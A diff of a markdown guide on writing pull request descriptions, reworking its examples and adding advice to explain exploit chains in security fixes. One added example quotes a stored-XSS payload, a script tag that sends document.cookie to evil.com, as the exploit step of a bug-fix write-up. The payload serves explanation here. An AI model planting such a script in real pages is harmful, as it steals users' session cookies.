@@ -9,22 +9,21 @@ This guide helps you write effective PR descriptions with a casual but experienc
 3. [Title Guidelines](#title-guidelines)
 4. [Description Guidelines](#description-guidelines)
 5. [Analyzing Commits for Content](#analyzing-commits-for-content)
-6. [Style Examples](#style-examples)
-7. [What to Include](#what-to-include)
-8. [Length Guidelines](#length-guidelines)
-9. [Platform-Specific Notes](#platform-specific-notes)
-10. [Quick Reference](#quick-reference)
+6. [Examples](#examples)
+7. [Security Fixes](#security-fixes)
+8. [What to Include](#what-to-include)
+9. [Length Guidelines](#length-guidelines)
+10. [Platform-Specific Notes](#platform-specific-notes)
+11. [Quick Reference](#quick-reference)
 
 ---
 
 ## Core Principles
 
-1. **Humble but experienced engineer tone** - You're explaining to a peer, not showing off
-2. **Casual and conversational** - Like you're talking over coffee, not writing a report
-3. **Explain WHY, not WHAT** - The code shows what changed; explain why you made those choices
-4. **No robot speak or marketing buzzwords** - Avoid "leverage", "implement robust solution", "enhance functionality"
-5. **Assume reader is technically competent** - Don't explain obvious things
-6. **Focus on non-obvious implementation choices** - Decisions, trade-offs, constraints
+1. **Write like a human, avoid AI patterns** - No em dashes, use commas, hyphens, or just split the sentence
+2. **Casual and conversational** - Like talking over coffee, not writing a report
+3. **Explain WHY, not WHAT** - The diff shows what changed, explain why you made those choices
+4. **Assume the reader can code** - Don't explain obvious things, focus on decisions and trade-offs
 
 ## Structure
 
@@ -35,15 +34,12 @@ This guide helps you write effective PR descriptions with a casual but experienc
 
 [Optional: More context - decisions, trade-offs, constraints that aren't obvious]
 
-## Changes
+## Changes (for larger PRs)
 - Key change 1 (focus on why, not what)
 - Key change 2
 - Key change 3
 
-## Testing
-- [ ] Tested locally
-- [ ] Added/updated tests
-- [ ] Verified [relevant scenario]
+[Optional: call out risk level and what you tested if it's worth mentioning]
 ```
 
 ## Title Guidelines
@@ -130,20 +126,6 @@ List 3-5 key changes. Focus on WHY, not WHAT:
 - Added documentation
 ```
 
-### Testing section
-
-Brief checklist of what was verified:
-
-```markdown
-## Testing
-- [ ] Tested locally with dev DB
-- [ ] Added tests for SSO flow
-- [ ] Verified existing users can still log in
-- [ ] Checked Redis fallback when cache is down
-```
-
-Don't list obvious things like "code compiles" or "tests pass".
-
 ## Analyzing Commits for Content
 
 ### Single commit
@@ -164,76 +146,50 @@ Fixed a few unrelated issues:
 - Added missing index on orders table (queries were slow)
 ```
 
-## Style Examples
+## Examples
 
-### Example 1: Feature addition
+### Small: one-liner bug fix
 
-✅ **Good:**
+```markdown
+fix(mobile): logout button z-index
+
+Was hidden behind the nav on small viewports. Bumped z-index and added a test.
+```
+
+### Small: config change
+
+```markdown
+Bump Node to 20 LTS
+
+18 goes EOL next month, and we need the built-in fetch for the webhook rewrite.
+```
+
+### Medium: feature
+
 ```markdown
 Add email verification for new signups
 
 We were getting a lot of fake accounts, so now new users need to verify their email before they can post. Went with a simple token-in-URL approach rather than magic links since we don't have email rendering set up yet.
 
-## Changes
-- New verification flow after signup (before user can access dashboard)
-- Tokens expire after 24 hours to limit DB bloat
+- Verification flow runs after signup, before user can access dashboard
+- Tokens expire after 24 hours to keep the table clean
 - Existing users are grandfathered in as verified
-
-## Testing
-- [ ] Tested signup flow with real email
-- [ ] Verified expired tokens are rejected
-- [ ] Checked existing users can still log in
 ```
 
-❌ **Bad:**
+### Medium: bug fix
+
 ```markdown
-Implement comprehensive email verification system
+Fix double-charge on rapid checkout clicks
 
-This PR implements a robust email verification system to enhance security and prevent unauthorized access. The solution leverages token-based authentication and follows industry best practices.
+Orders were sometimes charging twice when users double-clicked the button. Added a processing state to disable the button, plus idempotency keys on the Stripe side just to be safe.
 
-## Changes
-- Implemented email verification functionality
-- Created verification token generation system
-- Added email sending capabilities
-- Updated user model to include verification status
-- Enhanced security measures
-- Improved user experience
-- Added comprehensive test coverage
-- Updated documentation
+Tested with rapid clicks and flaky network. Stripe dashboard confirms single charge.
 ```
 
-### Example 2: Bug fix
+### Large: refactor
 
-✅ **Good:**
 ```markdown
-Fix race condition in payment processing
-
-Orders were sometimes charging twice when users double-clicked the checkout button. Added a processing state and disabled the button, plus idempotency keys on the Stripe side just to be safe.
-
-## Testing
-- [ ] Verified rapid clicks don't cause double charge
-- [ ] Tested with flaky network (slow responses)
-- [ ] Checked Stripe dashboard shows single charge
-```
-
-❌ **Bad:**
-```markdown
-Fix payment processing issue
-
-This PR resolves a critical issue in the payment processing system where duplicate charges could occur under certain race conditions.
-
-## Changes
-- Fixed race condition
-- Added button state management
-- Implemented idempotency
-- Improved error handling
-```
-
-### Example 3: Refactoring
-
-✅ **Good:**
-```markdown
-Break up god-class OrderService
+Break up OrderService
 
 OrderService was doing too much (validation, pricing, inventory, shipping). Split it into focused services. Left the old class as a facade for now since there are a lot of call sites to update.
 
@@ -243,24 +199,66 @@ OrderService was doing too much (validation, pricing, inventory, shipping). Spli
 - Created ShippingService for carrier logic
 - OrderService now just orchestrates the others
 
-## Testing
-- [ ] All existing tests still pass (using facade)
-- [ ] Added tests for new services in isolation
+Low risk since everything still goes through the facade. Existing tests pass without changes.
 ```
 
-❌ **Bad:**
-```markdown
-Refactor OrderService for improved architecture
+### Large: migration
 
-This PR refactors the OrderService class to improve code organization and maintainability through separation of concerns.
+```markdown
+Migrate auth from sessions to JWT
+
+We need to support mobile apps, and they don't handle cookies well. Switched to JWT with refresh tokens. Kept session support behind a feature flag since we can't migrate all web users at once.
+
+Refresh token rotation is a bit involved - each use generates a new token and kills the old one. Limits the window if a token gets stolen. Tokens live in Redis with a 7-day TTL, purged on logout.
+
+Went with localStorage for web and secure storage for mobile. Yeah, XSS is a risk, but we have CSP and this unblocks the mobile launch.
 
 ## Changes
-- Refactored OrderService
-- Created new service classes
-- Improved code organization
-- Enhanced testability
-- Better separation of concerns
+- JWT auth with RS256 (public/private key pair)
+- Refresh token rotation to prevent reuse
+- Feature flag to switch between session and JWT
+- Migration script to generate tokens for active sessions
+
+Touches the entire auth path, so worth a careful look. Tested on both web and mobile (iOS + Android). Flag defaults to off so existing sessions keep working.
 ```
+
+### Security fix
+
+```markdown
+Fix stored XSS in profile bio
+
+The bio field accepted raw HTML and rendered it unescaped. An attacker could put a script tag in their bio that runs for anyone viewing their profile, stealing session cookies and leading to account takeover.
+
+Switched to DOMPurify for sanitization. Also added CSP headers as defense in depth.
+
+## Exploit chain
+1. Attacker sets bio to `<script>fetch('https://evil.com?c='+document.cookie)</script>`
+2. Victim views the profile
+3. Script exfiltrates session cookies
+4. Attacker replays the cookie
+
+MITRE ATT&CK: T1189 (Drive-by Compromise), T1539 (Steal Web Session Cookie)
+```
+
+### UI change
+
+```markdown
+Redesign checkout flow for mobile
+
+The old checkout was a single long form that was painful on phones. Split it into 3 steps with a progress indicator. Conversion numbers on mobile have been bad and this was the main complaint in user feedback.
+
+Screenshots in the PR comments.
+
+## Changes
+- 3-step wizard: shipping, payment, review
+- Progress bar at the top
+- Form state persists between steps (no data loss on back)
+- Same single-page flow on desktop, only splits on viewports under 768px
+```
+
+## Security Fixes
+
+For security PRs, explain the exploit chain so reviewers understand the actual risk. Reference MITRE ATT&CK techniques where applicable (e.g. T1539 - Steal Web Session Cookie). If people don't understand how serious it is, security PRs get deprioritized.
 
 ## What to Include
 
@@ -271,6 +269,7 @@ This PR refactors the OrderService class to improve code organization and mainta
 - **Constraints:** Time, compatibility, dependencies
 - **Future considerations:** "We'll need this when..." or "Left old code because..."
 - **Context for reviewers:** Things that might be surprising or need explanation
+- **Security fixes:** Explain the exploit chain and reference MITRE ATT&CK techniques
 
 ### ❌ Skip
 
@@ -282,56 +281,13 @@ This PR refactors the OrderService class to improve code organization and mainta
 
 ## Length Guidelines
 
-### Minimum (simple PRs)
-2-3 sentences explaining what and why:
-```markdown
-Fix broken logout button on mobile
+Scale to match the PR. See the [Examples](#examples) section for what each size looks like.
 
-The button was hidden behind the nav on small screens. Adjusted z-index and added a test for the viewport.
-```
+- **Small** (1-2 commits, <50 lines): a sentence or two, no sections
+- **Medium** (3-5 commits, 50-300 lines): short intro + bullets if needed
+- **Large** (5+ commits, 300+ lines): full context, changes section, risk callout
 
-### Typical (most PRs)
-1-2 paragraphs + bullet points:
-```markdown
-Add rate limiting to API endpoints
-
-We were getting hammered by a misconfigured client last week. Added simple rate limiting (100 req/min per IP) using Redis. Went with fixed window instead of sliding window for simplicity - if abuse becomes more sophisticated we can upgrade later.
-
-## Changes
-- Rate limit middleware using Redis (falls back to in-memory if Redis is down)
-- 429 responses with Retry-After header
-- Exempted health check endpoint
-
-## Testing
-- [ ] Verified limits trigger after 100 requests
-- [ ] Tested Redis failover to in-memory
-- [ ] Health check still works
-```
-
-### Maximum (complex PRs)
-3-4 paragraphs + details. If you need more than this, consider if the PR should be split:
-```markdown
-Migrate authentication from sessions to JWT
-
-We need to support mobile apps, which don't handle cookies well. Switched to JWT with refresh tokens. Kept session support for now with a feature flag since we can't migrate all web users immediately.
-
-The refresh token rotation is a bit complex - each use generates a new refresh token and invalidates the old one. This limits the window for token theft. Tokens are stored in Redis with a 7-day TTL, and we purge them on logout.
-
-Considered using httpOnly cookies for the JWT, but mobile webviews are inconsistent with cookie handling. Went with localStorage for web and secure storage for mobile. Yeah, XSS is a risk, but we have CSP and this unblocks the mobile launch.
-
-## Changes
-- JWT auth with RS256 (public/private key pair)
-- Refresh token rotation (prevents token reuse)
-- Feature flag to switch between session and JWT
-- Migration script to generate tokens for active sessions
-
-## Testing
-- [ ] Web login flow with JWT
-- [ ] Mobile app login (tested on iOS/Android)
-- [ ] Token refresh before expiry
-- [ ] Logout invalidates tokens
-- [ ] Old session auth still works (feature flag)
-```
+If you need more than 3-4 paragraphs, the PR should probably be split.
 
 ## Platform-Specific Notes
 
